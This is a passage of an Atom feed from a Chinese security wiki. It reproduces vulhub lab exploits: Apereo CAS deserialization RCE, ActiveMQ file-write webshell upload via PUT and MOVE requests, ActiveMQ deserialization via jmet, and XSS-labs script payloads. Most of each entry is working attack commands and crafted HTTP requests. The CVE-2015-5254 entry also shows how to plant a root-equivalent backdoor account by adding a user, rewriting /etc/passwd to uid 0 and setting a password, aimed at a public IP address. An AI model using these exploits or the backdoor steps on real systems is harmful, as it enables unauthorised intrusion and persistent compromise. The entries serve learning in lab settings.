<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>s40d1&#39;s Wiki</title>
  
  <subtitle>做一个骚人！</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://s40d1.github.io/"/>
  <updated>2020-10-17T09:22:48.101Z</updated>
  <id>https://s40d1.github.io/</id>
  
  <author>
    <name>s40d1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apereo%20CAS%204.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apereo%20CAS%204.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-10-17T09:25:28.829Z</published>
    <updated>2020-10-17T09:22:48.101Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apereo-CAS-4-1-反序列化命令执行漏洞复现"><a href="#Apereo-CAS-4-1-反序列化命令执行漏洞复现" class="headerlink" title="Apereo CAS 4.1 反序列化命令执行漏洞复现"></a>Apereo CAS 4.1 反序列化命令执行漏洞复现</h1><p>[TOC]<br>Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p><h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><p>执行如下命令启动一个Apereo CAS 4.1.5：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境启动后，访问<code>http://your-ip:8080/cas/login</code>即可查看到登录页面。<br><img src="https://note.youdao.com/yws/public/resource/7cfe41150d8cf491bcd63a3905aeb798/EE4D2F3E0BE344A8B51C0D857F3C2493?ynotemdtimestamp=1602926359557" alt="image"></p><h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><p>漏洞原理实际上是Webflow中使用了默认密钥<code>changeit</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EncryptedTranscoder</span> <span class="keyword">implements</span> <span class="title">Transcoder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> CipherBean cipherBean;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> compression = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EncryptedTranscoder</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        BufferedBlockCipherBean bufferedBlockCipherBean = <span class="keyword">new</span> BufferedBlockCipherBean();</span><br><span class="line">        bufferedBlockCipherBean.setBlockCipherSpec(<span class="keyword">new</span> BufferedBlockCipherSpec(<span class="string">"AES"</span>, <span class="string">"CBC"</span>, <span class="string">"PKCS7"</span>));</span><br><span class="line">        bufferedBlockCipherBean.setKeyStore(<span class="keyword">this</span>.createAndPrepareKeyStore());</span><br><span class="line">        bufferedBlockCipherBean.setKeyAlias(<span class="string">"aes128"</span>);</span><br><span class="line">        bufferedBlockCipherBean.setKeyPassword(<span class="string">"changeit"</span>);</span><br><span class="line">        bufferedBlockCipherBean.setNonce(<span class="keyword">new</span> RBGNonce());</span><br><span class="line">        <span class="keyword">this</span>.setCipherBean(bufferedBlockCipherBean);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>我们使用<a href="https://github.com/vulhub/Apereo-CAS-Attack" target="_blank" rel="external nofollow noopener noreferrer">Apereo-CAS-Attack</a>来复现这个漏洞。使用ysoserial的CommonsCollections4生成加密后的Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;touch &#x2F;tmp&#x2F;success&quot;</span><br></pre></td></tr></table></figure><p><img src="https://note.youdao.com/yws/public/resource/7cfe41150d8cf491bcd63a3905aeb798/8C97B3F1CE11421AB3A3A5590A5E74B1?ynotemdtimestamp=1602926359557" alt="image"></p><p>然后我们登录CAS并抓包，将Body中的<code>execution</code>值替换成上面生成的Payload发送：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;cas&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Content-Length: 2287</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;your-ip:8080</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.89 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;your-ip:8080&#x2F;cas&#x2F;login</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en,zh-CN;q&#x3D;0.9,zh;q&#x3D;0.8</span><br><span class="line">Cookie: JSESSIONID&#x3D;24FB4BAAE1A66E8B76D521EE366B3E12; _ga&#x3D;GA1.1.1139210877.1586367734</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username&#x3D;test&amp;password&#x3D;test&amp;lt&#x3D;LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&amp;execution&#x3D;[payload]&amp;_eventId&#x3D;submit&amp;submit&#x3D;LOGIN</span><br></pre></td></tr></table></figure><p><img src="https://note.youdao.com/yws/public/resource/7cfe41150d8cf491bcd63a3905aeb798/376054668D7843C49F9C5CF0D4ADEB81?ynotemdtimestamp=1602926359557" alt="image"></p><p>登录Apereo CAS，可见<code>touch /tmp/success</code>已成功执行，即漏洞复现成功：</p><p><img src="https://note.youdao.com/yws/public/resource/7cfe41150d8cf491bcd63a3905aeb798/308FB455D9B24A488C18489DCA7A57AD?ynotemdtimestamp=1602926359557" alt="image"></p><h2 id="三、防御措施"><a href="#三、防御措施" class="headerlink" title="三、防御措施"></a>三、防御措施</h2><p>升级到安全版本版本。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Apereo-CAS-4-1-反序列化命令执行漏洞复现&quot;&gt;&lt;a href=&quot;#Apereo-CAS-4-1-反序列化命令执行漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;Apereo CAS 4.1 反序列化命令执行漏洞复现&quot;&gt;&lt;/a&gt;Apere
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
      <category term="Web渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"/>
    
      <category term="漏洞复现" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现</title>
    <link href="https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ActionMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2016-3088%EF%BC%89%E5%A4%8D%E7%8E%B0/"/>
    <id>https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ActionMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2016-3088%EF%BC%89%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-10-17T02:57:56.532Z</published>
    <updated>2020-10-17T09:27:39.311Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><a href="#ActiveMQ任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"></a>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h1><p>[TOC]</p><h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><p>搭建及运行漏洞环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境监听61616端口和8161端口，其中8161为web控制台端口，本漏洞就出现在web控制台中。</p><p>访问<code>http://your-ip:8161/</code>看到web页面，说明环境已成功运行。</p><h2 id="二、背景简述"><a href="#二、背景简述" class="headerlink" title="二、背景简述"></a>二、背景简述</h2><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p><p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：</p><ol><li>其使用率并不高</li><li>文件操作容易出现漏洞</li></ol><p>所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</p><p>在测试过程中，可以关注ActiveMQ的版本，避免走弯路。</p><h2 id="三、影响版本"><a href="#三、影响版本" class="headerlink" title="三、影响版本"></a>三、影响版本</h2><p>Apache ActiveMQ 5.0.0 - 5.13.2</p><h2 id="四、漏洞详情"><a href="#四、漏洞详情" class="headerlink" title="四、漏洞详情"></a>四、漏洞详情</h2><p>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p><p>文件写入有几种利用方法：</p><ol><li>写入webshell</li><li>写入cron或ssh key等文件</li><li>写入jar或jetty.xml等库和配置文件</li></ol><p>写入webshell的好处是，门槛低更方便，但前面也说了fileserver不解析jsp，admin和api两个应用都需要登录才能访问，所以有点鸡肋；写入cron或ssh key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限；写入jar，稍微麻烦点（需要jar的后门），写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我们需要知道activemq的绝对路径。</p><h2 id="五、漏洞防御"><a href="#五、漏洞防御" class="headerlink" title="五、漏洞防御"></a>五、漏洞防御</h2><p>1、ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。</p><h2 id="六、漏洞利用案例"><a href="#六、漏洞利用案例" class="headerlink" title="六、漏洞利用案例"></a>六、漏洞利用案例</h2><h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>前面说了，写入webshell，需要写在admin或api应用中，而这俩应用都需要登录才能访问。</p><p>默认的ActiveMQ账号密码均为<code>admin</code>，首先访问<code>http://your-ip:8161/admin/test/systemProperties.jsp</code>，查看ActiveMQ的绝对路径：</p><p><img src="https://note.youdao.com/yws/public/resource/dc2268167e3b898780f887c2e8638a5f/88FC9AB842434754928CC65F32248EAD?ynotemdtimestamp=1602903244523" alt="image"></p><p>然后上传webshell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 120976</span><br><span class="line"></span><br><span class="line">webshell...</span><br></pre></td></tr></table></figure><p><img src="https://note.youdao.com/yws/public/resource/dc2268167e3b898780f887c2e8638a5f/12472748CA26493C99C5BB14B04CF546?ynotemdtimestamp=1602903244523" alt="image"><br>访问文件内容如如下：<br><img src="https://note.youdao.com/yws/public/resource/dc2268167e3b898780f887c2e8638a5f/229A09183670423EAB97E4DE60418B30?ynotemdtimestamp=1602903244523" alt="image"></p><p>移动到web目录下的api文件夹（<code>/opt/activemq/webapps/api/s.jsp</code>）中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;1.jsp</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p><img src="https://note.youdao.com/yws/public/resource/dc2268167e3b898780f887c2e8638a5f/7E74CAB5510F4F0A93881145E574B86F?ynotemdtimestamp=1602903244523" alt="image"></p><p>成功访问webshell，表明webshell写入成功：</p><p><img src="https://note.youdao.com/yws/public/resource/dc2268167e3b898780f887c2e8638a5f/91850F5EF4D74E93A320159AD2BB6B0B?ynotemdtimestamp=1602903244523" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ActiveMQ任意文件写入漏洞（CVE-2016-3088）&quot;&gt;&lt;a href=&quot;#ActiveMQ任意文件写入漏洞（CVE-2016-3088）&quot; class=&quot;headerlink&quot; title=&quot;ActiveMQ任意文件写入漏洞（CVE-2016-3088
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
      <category term="Web渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"/>
    
      <category term="漏洞复现" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>ActiveMQ 反序列化漏洞（CVE-2015-5254）复现</title>
    <link href="https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2015-5254%EF%BC%89%E5%A4%8D%E7%8E%B0/"/>
    <id>https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2015-5254%EF%BC%89%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-10-16T15:15:51.131Z</published>
    <updated>2020-10-16T15:48:22.811Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的java消息服务(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p><h1 id="二、漏洞影响版本"><a href="#二、漏洞影响版本" class="headerlink" title="二、漏洞影响版本"></a>二、漏洞影响版本</h1><p>Apache ActiveMQ 5.13.0之前的版本</p><h1 id="三、漏洞环境搭建"><a href="#三、漏洞环境搭建" class="headerlink" title="三、漏洞环境搭建"></a>三、漏洞环境搭建</h1><p>使用docker搭建vulhub漏洞库。</p><p>启动环境：</p><p><img src="https://note.youdao.com/yws/public/resource/de560d8d63985fbef1ade17e53d8f851/55D5E6501130489E8EB90E76285237D0?ynotemdtimestamp=1602861058216" alt="image"></p><p>访问8161端口，如下图所示为管理员登录界面，环境搭建成功：</p><p><img src="https://note.youdao.com/yws/public/resource/de560d8d63985fbef1ade17e53d8f851/3A0398DA7C1F4E72AF1EF991678A216F?ynotemdtimestamp=1602861058216" alt="image"></p><h1 id="四、复现过程"><a href="#四、复现过程" class="headerlink" title="四、复现过程"></a>四、复现过程</h1><h2 id="1、登录"><a href="#1、登录" class="headerlink" title="1、登录"></a>1、登录</h2><p>访问目标8161端口，进行登录（admin，admin）<br><img src="https://note.youdao.com/yws/public/resource/de560d8d63985fbef1ade17e53d8f851/6F3A00AF033143209FF645A7719483D3?ynotemdtimestamp=1602861058216" alt="image"></p><h2 id="2、使用-jmet-进行漏洞利用"><a href="#2、使用-jmet-进行漏洞利用" class="headerlink" title="2、使用 jmet 进行漏洞利用"></a>2、使用 jmet 进行漏洞利用</h2><p>下载 jmet 的 jar 文件，并在同目录下创建一个 external 文件夹。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;opt</span><br><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;matthiaskaiser&#x2F;jmet&#x2F;releases&#x2F;download&#x2F;0.1.0&#x2F;jmet-0.1.0-all.jar</span><br><span class="line">mkdir external</span><br></pre></td></tr></table></figure><p><img src="https://note.youdao.com/yws/public/resource/de560d8d63985fbef1ade17e53d8f851/44835EBB6DCA40ED81BD4ECC0340FD75?ynotemdtimestamp=1602861058216" alt="image"></p><h2 id="3、执行命令"><a href="#3、执行命令" class="headerlink" title="3、执行命令"></a>3、执行命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:&#x2F;opt$ java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;sucess&quot; -Yp ROME &lt;IP&gt; 61616</span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings&#x3D;on -Dswing.aatext&#x3D;true</span><br><span class="line">INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:kali-33935-1602856866016-0:1</span><br><span class="line">INFO d.c.j.t.JMSTarget [main] Sent gadget &quot;ROME&quot; with command: &quot;touch &#x2F;tmp&#x2F;sucess&quot;</span><br><span class="line">INFO d.c.j.t.JMSTarget [main] Shutting down connection ID:kali-33935-1602856866016-0:1</span><br></pre></td></tr></table></figure><p>查看管理ActiveMQ管理界面（/admin/browse.jsp?JMSDestination=event），发现添加了一个队列：<br><img src="https://note.youdao.com/yws/public/resource/de560d8d63985fbef1ade17e53d8f851/9C6FC3B3C13147C4BC66D1F54FD0C322?ynotemdtimestamp=1602861058216" alt="image"></p><h2 id="4、触发"><a href="#4、触发" class="headerlink" title="4、触发"></a>4、触发</h2><p>点击队列查看消息即可触发命令执行：<br><img src="https://note.youdao.com/yws/public/resource/de560d8d63985fbef1ade17e53d8f851/F4F67F4A84C943459B0E7B68B6C546B5?ynotemdtimestamp=1602861058216" alt="image"></p><h2 id="5、结果验证"><a href="#5、结果验证" class="headerlink" title="5、结果验证"></a>5、结果验证</h2><p>进入容器：<br><img src="https://note.youdao.com/yws/public/resource/de560d8d63985fbef1ade17e53d8f851/80D5ED77A4A14D6F8B12FE8BD2FF9793?ynotemdtimestamp=1602861058216" alt="image"><br>/tmp/sucess目录被创建成功：</p><p><img src="https://note.youdao.com/yws/public/resource/de560d8d63985fbef1ade17e53d8f851/39B4CE258F1644658F1232D2B43433AD?ynotemdtimestamp=1602861058216" alt="image"></p><h1 id="五、利用之添加用户操作"><a href="#五、利用之添加用户操作" class="headerlink" title="五、利用之添加用户操作"></a>五、利用之添加用户操作</h1><p>执行 jmet 的命令添加 test 用户并将其添加到 root：<br>1、执行添加用户命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;useradd -g root -s &#x2F;bin&#x2F;bash -u 10010 test&quot; -Yp ROME 139.180.217.179 61616</span><br></pre></td></tr></table></figure><p>2、将 passwd 中的 test 的 uid 修改为 0，使它拥有 root ，执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;sed -i  &quot;s&#x2F;test:x10010&#x2F;test:x0&#x2F;g&quot; &#x2F;etc&#x2F;passwd&quot; -Yp ROME 139.180.217.179 61616</span><br></pre></td></tr></table></figure><p>3、为 test 用户设置一个密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;echo &quot;test:sd123456&quot; | chpasswd&quot; -Yp ROME 139.180.217.179 61616</span><br></pre></td></tr></table></figure><p>到此为止，一个权限为 root，密码为 123456 的用户即创建完毕。</p><p>cat /etc/passwd 查看用户权限</p><p><img src="https://note.youdao.com/yws/public/resource/de560d8d63985fbef1ade17e53d8f851/4648BF9A03354C1DBD4A117A9BF8E034?ynotemdtimestamp=1602861058216" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;一、漏洞描述&quot;&gt;&lt;a href=&quot;#一、漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;一、漏洞描述&quot;&gt;&lt;/a&gt;一、漏洞描述&lt;/h1&gt;&lt;p&gt;该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的java
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
      <category term="Web渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"/>
    
      <category term="漏洞复现" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>XSS-labs通关记</title>
    <link href="https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/xsslabs%E9%80%9A%E5%85%B3%E8%AE%B0/"/>
    <id>https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/xsslabs%E9%80%9A%E5%85%B3%E8%AE%B0/</id>
    <published>2020-10-08T09:01:23.498Z</published>
    <updated>2020-10-13T06:21:15.488Z</updated>
    
    <content type="html"><![CDATA[<p>@<a href="目录">TOC</a></p><h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><p><img src="https://img-blog.csdnimg.cn/20201005132803821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="level1"><br>当前页面输入点为url中name参数，页面中会将参数值的内容和字符长度暂时出来。接下来就先在name参数值上做动作：<br>源码内容如图，我们可以尝试在“欢迎用户test”处插入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>进行测试：<br><img src="https://img-blog.csdnimg.cn/20201005152337306.png#pic_center" alt="源码内容"><br>测试通过:<br><img src="https://img-blog.csdnimg.cn/20201005155246134.png#pic_center" alt="代码被完整植入"><br><img src="https://img-blog.csdnimg.cn/20201005153250950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p><img src="https://img-blog.csdnimg.cn/20201005155811682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="level2"><br>level2中可尝试利用输入点为keyword参数，有两处输出显示位置：<br><img src="https://img-blog.csdnimg.cn/20201005160116840.png#pic_center" alt="在这里插入图片描述"><br>使用<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>进行测试，发现<code>&lt;h2&gt;</code>标签内的<code>&lt;&gt;</code>被实体化编码了，但是<code>&lt;input&gt;</code>标签内的并没有被实体化编码：<br><img src="https://img-blog.csdnimg.cn/20201005161755134.png#pic_center" alt="在这里插入图片描述"><br>故接下来对<code>input</code>标签下手，构造闭合payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure><p>形成完美的payload闭合：<br><img src="https://img-blog.csdnimg.cn/2020100516390546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201005163427934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p><img src="https://img-blog.csdnimg.cn/20201005165302639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>level3中可尝试利用的输入点同样为keyword参数，有两处输出显示位置。使用和level相同的方法（level2闭合使用的双引号、在level3中为单引号）进行测试，发现<code>&lt;input&gt;</code>标签内的输出也对<code>&lt;&gt;</code>进行了编码：<br><img src="https://img-blog.csdnimg.cn/20201005171137427.png#pic_center" alt="在这里插入图片描述"><br>所以这里就不适合使用带有<code>&lt;&gt;</code>的payload，构造如下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 